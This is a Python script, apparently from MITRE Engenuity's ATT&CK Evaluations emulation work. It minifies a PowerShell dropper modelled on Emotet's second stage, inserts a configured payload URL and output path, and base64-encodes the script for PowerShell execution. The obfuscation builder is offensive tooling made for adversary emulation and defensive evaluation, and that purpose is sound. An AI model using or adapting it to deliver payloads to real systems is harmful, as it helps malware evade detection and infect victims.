#!/usr/bin/python3 -tt
"""
       Filename:  obfuscate_stage2_dropper.py

    Description:  This program configures and obfuscates "drop_emotet_stage2.ps1."
                  The obfuscation feature removes whitespace and comments, and
                  base64 encodes the script.
                  The configuration feature replaces variables such as $URL and
                  $outfile with their plaintext values, as specified in a config file.
   
        Version:  1.0
        Created:  March 12th, 2021

      Author(s):  Michael C. Long II
   Organization:  MITRE Engenuity

  References(s): N/A
"""
import argparse
import base64
import logging
import sys
import yaml


def get_configuration(config_file):
    """
    Read YAML configuration file, and return config data as list of key value pairs
    """
    try:
        file = open(config_file, "r")
        config = yaml.safe_load(file)
        file.close()
        return config

    except Exception as err:
        logging.error(
            "Failed to read configuration file: {}".format(config_file))
        sys.stderr.write(str(err))
        sys.exit(-1)


def minify_powershell_script(file_path):
    """
    Remove script headers, comments, and white space from PowerShell script.
    This script uses in-text delimiters to know when to start and stop.
    """
    start_delim = "#<Start-ATT&CK-Evals-Delimiter>"
    end_delim = "#<End-ATT&CK-Evals-Delimiter>"
    continue_parsing = False
    minified_script = ""

    # read until delimiter
    script = open(file_path)
    for line in script:
        if start_delim in line:
            continue_parsing = True
        elif end_delim in line:
            continue_parsing = False

        # start parsing
        if continue_parsing:

            # remove white space
            line = line.strip()

            # ignore commented lines
            if line.startswith("#"):
                continue

            # ignore blank lines
            if len(line) == 0:
                continue

            # append semi-colon to each valid line
            line += ";"
            minified_script += line

    script.close()
    return minified_script


def configure_minified_script(minified_script, config):
    """Insert values into minified PowerShell script based on config file"""

    # Add double quotes around each value, otherwise,
    # powershell will parse incorrectly and fail
    url = '"' + config["url_to_payload"] + '"'
    out_dir = '"' + config["directory_to_write_payload"] + '"'
    out_file = '"' + config["payload_file_name"] + '"'

    # substitute values based on config file
    configured_script = minified_script.replace(
        "$URL", url)

    configured_script = configured_script.replace(
        "$outdir", out_dir)

    configured_script = configured_script.replace(
        "$outfile", out_file)

    return configured_script


def write_script(script, name):
    """Write script contents to file"""

    file = ""
    if isinstance(script, str):
        try:
            file = open(name, "w")
        except Exception as err:
            logging.error(
                "Failed to write file: {}".format(name))
            sys.stderr.write(str(err))
            sys.exit(-1)

    # base64 data is a bytes object, which requires writting in 'wb' mode
    else:
        try:
            file = open(name, "wb")
        except Exception as err:
            logging.error(
                "Failed to write file: {}".format(name))
            sys.stderr.write(str(err))
            sys.exit(-1)

    file.write(script)
    file.close()


def base64_encode_script(script):
    """Base64 encode script in UTF-16-LE format; needed for PowerShell to decode properly"""
    script_bytes = bytes(script, 'UTF-16-LE')
    encoded = base64.b64encode(script_bytes)
    return encoded


def main():
    """Program entry point."""

    # handle command line arguments
    parser = argparse.ArgumentParser()
    parser.add_argument("-c", "--conf", required=True,
                        help="Configuration file to read")
    parser.add_argument("-i", "--infile", required=True,
                        help="Output file")
    parser.add_argument("-o", "--outfile", required=True,
                        help="Output file")
    parser.add_argument("-v", "--verbose", action='count',
                        default=0, help="Print verbose output")
    args = parser.parse_args()

    # parse input and output file arguments
    config_file = args.conf
    output_file = args.outfile
    in_file = args.infile

    # handle verbose printing
    if args.verbose:
        logging.basicConfig(
            format="%(levelname)s: %(message)s", level=logging.DEBUG)
    else:
        logging.basicConfig(
            format="%(levelname)s: %(message)s", level=logging.ERROR)

    # read config file
    logging.info("Reading config file: {}".format(config_file))
    config = get_configuration(config_file)

    # minify powershell dropper script
    logging.info(
        "Stripping white space and comments from script: {}".format(in_file))
    minified_script = minify_powershell_script(in_file)

    # update minified script with configured values
    logging.info("Updating script with configured values")
    configured_script = configure_minified_script(
        minified_script, config)
    logging.info("Configured script:\n\n{}\n".format(configured_script))

    # base64 encode script
    logging.info("Base64 encoding script")
    encoded = base64_encode_script(configured_script)
    write_script(encoded, output_file)
    logging.info("Encoded script:\n\n{}\n".format(encoded))

    print("[+] Obfuscated dropper written to: {}".format(output_file))

    return


if __name__ == "__main__":
    main()
